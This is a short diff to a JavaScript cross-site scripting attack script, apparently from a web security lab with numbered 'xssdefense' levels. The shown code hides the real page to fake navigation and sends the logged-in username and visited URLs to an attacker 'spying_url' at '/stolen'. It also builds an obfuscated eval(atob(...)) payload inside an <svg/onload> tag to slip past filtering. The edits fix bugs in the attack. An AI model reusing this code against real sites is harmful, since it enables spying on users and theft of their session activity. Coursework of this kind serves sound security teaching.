@@ -13,7 +13,6 @@ function payload(attacker) {
 	// This function can make it appear that a new page has been loaded
 	// Note that you can proxy the main page, or a search page!
 	function proxy(href, spying_url) {
-
 		// Make all current HTML invisible.
 		$('html').hide();
 
@@ -33,7 +32,7 @@ function payload(attacker) {
 			}
 
 			var username = $("#logged-in-user").text();
-			if (user) {
+			if (username) {
 				$.get(spying_url + '/stolen', {event: 'nav', user: username, url: href});
 			}
 			else {
@@ -161,7 +160,8 @@ function makeLink(target, attacker, defense) {
                 charcode+=',';
                                     }
                         charcode+=")";
-            var real_payload = "eval(atob(\""+charcode+"\"))";
+            var real_payload = "eval(atob("+charcode+"))";
+            console.log(real_payload);
 			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
